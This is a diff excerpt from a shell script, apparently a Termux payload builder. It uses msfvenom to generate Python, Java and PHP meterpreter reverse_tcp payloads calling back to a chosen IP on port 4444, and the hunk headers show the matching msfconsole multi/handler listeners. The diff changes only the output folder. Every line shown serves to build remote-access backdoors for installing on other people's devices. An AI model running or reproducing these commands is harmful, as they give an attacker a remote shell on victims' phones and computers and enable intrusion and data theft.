@@ -88,7 +88,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
 
 
 elif [ "$x" == "$py" ]; then                       #PYTHON
-msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/test.py
+msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/shared/test.py
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -104,7 +104,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/rev
 
 
 elif [ "$x" == "$jar" ]; then                        #JAVA
-msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/data/data/com.termux/files/home/storage/test.jar
+msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/data/data/com.termux/files/home/storage/shared/test.jar
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -123,7 +123,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/rever
 
 
 elif [ "$x" == "$php" ]; then                        #PHP
-msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/test.php
+msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/shared/test.php
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
